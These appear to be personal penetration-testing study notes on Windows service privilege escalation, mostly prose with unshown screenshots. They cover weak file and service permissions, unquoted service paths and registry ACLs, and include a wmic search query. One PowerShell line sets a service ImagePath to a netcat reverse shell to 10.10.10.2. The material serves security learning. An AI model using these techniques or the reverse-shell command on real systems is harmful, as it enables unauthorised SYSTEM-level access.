#### Permissive File System ACLs

SharpUp from the GhostPack suite can check for service binaries w/ weak permissions

![[Pasted image 20230107100854.png]]

The tool identifies the PC Security Management Service, which executes the `SecurityService.exe`

#### Checking Permissions with icacls

Using icacls we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups
have been granted full permissions to the directory.

![[Pasted image 20230107101145.png]]

#### Replacing Service Binary

The service is also startable by unprivileged users. We can make a backup of the original binary
and replace it with a malicious binary generated with msfvenom.

![[Pasted image 20230107101620.png]]

## Weak Service Permissions

#### Reviewing SharpUp Again

![[Pasted image 20230107101928.png]]

#### Checking Permissions with AccessChk

![[Pasted image 20230107102139.png]]

#### Check Local Admin Group

Our user is confirmed `not a member` of adminsitrators group:

![[Pasted image 20230107102343.png]]

#### Changing the Service Binary Path

We can use our permissions to change the binary path maliciously, adding to local admin group.

![[Pasted image 20230107102539.png]]

#### Stopping/Starting Service

![[Pasted image 20230107102558.png]]

![[Pasted image 20230107102609.png]]

![[Pasted image 20230107102922.png]]

Another notable example is the Windows `Update Orchestrator Service (UsoSvc)` which is
responsible for downloading and installing operating system updates.

Before installing the security patch relating to CVE-2019-1322 it was possible to elevate
privileges form a service account to SYSTEM. This was due to weak permissions, which allowed
service accounts to modify the service binary path and start/stop the service.

## Cleanup

#### Reverting the Binary Path

![[Pasted image 20230107103423.png]]

#### Starting the Service Again

![[Pasted image 20230107103446.png]]

![[Pasted image 20230107103501.png]]

## Unquoted Service Path

#### Service Binary Path

![[Pasted image 20230107103537.png]]

Windows will decide the execution method of a program based on it's file extension, so it's not
necessary to specify it. Windows will attempt to load the following potential executables in order
on service start, with a.exe being implied:

`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

#### Querying Service

![[Pasted image 20230107103736.png]]

If we can create the following files, we would be able to hijack the service binary and gain
command execution in the context of the service. In this case, `NT AUTHORITY\SYSTEM`

-  `C:\Program.exe\
-  `C:\Program Files (x86)\System.exe`

However, creating files in the root of the drive or the program files folder requires administrator
privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be
able to restart the service and would be reliant on a system restart to escalate privileges.

Although it's not uncommon to find applications with unquoted service paths, it's often unexploitable.

#### Searching For Unquoted Service Paths

```
wmic service get name,displayname,pathname,startmode | 
	findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
```

![[Pasted image 20230107110017.png]]

## Permissive/Weak Registry ACLs

![[Pasted image 20230107110053.png]]

#### Changing ImagePath with Powershell

We can abuse the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value:
```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService
	-Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.2 443"
```

## Modifiable Registry Autorun Binaries

We can use WMIC to see what programs run at system startup. Some binaries that can be
overwritten/ Overwrite the registry, and will be executed at start-up/login:

![[Pasted image 20230107110527.png]]

This post https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
and this site https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2
detail many potential autorun locations on Windows systems.